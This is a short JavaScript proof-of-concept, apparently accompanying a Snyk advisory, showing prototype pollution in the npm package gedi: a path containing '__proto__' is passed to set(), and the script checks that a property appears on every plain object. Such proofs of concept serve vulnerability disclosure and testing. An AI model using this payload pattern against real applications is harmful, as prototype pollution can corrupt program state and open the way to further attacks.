//https://snyk.io/vuln/SNYK-JS-GEDI-598803
const gedi = require("gedi");
gedi().set("[__proto__/polluted]", "yes");

console.log({}.polluted)